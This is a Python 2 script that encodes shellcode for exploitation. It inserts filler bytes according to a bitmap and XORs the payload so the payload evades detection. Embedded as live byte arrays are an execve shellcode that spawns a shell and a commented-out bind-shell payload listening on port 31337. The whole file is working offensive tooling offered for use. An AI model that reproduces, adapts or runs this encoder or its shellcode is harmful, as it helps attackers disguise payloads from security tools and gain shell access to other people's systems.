#! /usr/bin/env python

# This is a simple script to obfuscate/encode the shellcode payload.
# This implements padding with invalid bytes within the payload at 
# designated places(based on the bit pattern provided) and XORing
# the final payload.
# 		-- Vikrant Navalgund

hexstring="00100D6E" # Used for the bitmap

bit_size_n = len(hexstring) * 4
bit_string = (bin(int(hexstring, 16))[2:]).zfill(bit_size_n)
print "[+] Bit map string: ", bit_string, "\n"

# Replace this hex array with any shellcode that needs to be encoded - has to be '0x' hex values.
# Execve Shellcode - '/bin/bash'
hex_array = [ 0x31,0xc0,0xb0,0x0b,0xeb,0x14,0x5e,0x89,0xf3,0x31,0xc9,0x88,0x4e,0x07,0x51,0x56,0x89,0xe1,0x31,0xd2,0x52,0x89,0xe2,0xcd,0x80,0xc3,0xe8,0xe7,0xff,0xff,0xff,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x6f,0x70,0x74 ] 

# Port binding shellcode - port(31337)
#hex_array = [ 0x6a,0x66,0x58,0x99,0x31,0xdb,0x43,0x52,0x6a,0x01,0x6a,0x02,0x89,0xe1,0xcd,0x80,0x89,0xc6,0x43,0x66,0xb8,0x69,0x7a,0x86,0xe0,0x52,0x66,0x50,0x66,0x53,0x89,0xe1,0x6a,0x66,0x58,0x6a,0x10,0x51,0x56,0x89,0xe1,0xcd,0x80,0xb0,0x66,0x43,0x43,0x53,0x56,0x89,0xe1,0xcd,0x80,0xb0,0x66,0x43,0x52,0x52,0x56,0x89,0xe1,0xcd,0x80,0x89,0xc3,0x31,0xc9,0x31,0xc0,0xb0,0x3f,0xcd,0x80,0x41,0x80,0xf9,0x02,0x7e,0xf6,0xb0,0x0b,0x52,0x68,0x2f,0x2f,0x73,0x68,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0x31,0xc9,0x51,0x89,0xe2,0x53,0x89,0xe1,0xcd,0x80 ]

payload_n = len(hex_array)
print "[+] Input Payload length:", payload_n, "bytes\n"

valid_bits = 0
set_size = 0

while valid_bits <= payload_n: 
	if valid_bits == payload_n:
		break 
	for b in range(len(bit_string)):
		if valid_bits >= payload_n:
			break 
		if bit_string[b] == '0':
			hex_array.insert(b + set_size, 0xaa)
		else:
			valid_bits = valid_bits + 1
			if valid_bits == payload_n:
				break 
 	set_size = set_size + 32

print "[+] Final Encoded Payload length:", len(hex_array), "bytes\n"
print ','.join([hex(i ^ 0xee ) for i in hex_array])
print "\n"
print "[+] Signal/Noise ratio: %0.2f\n" % (float(payload_n)/float(len(hex_array)))

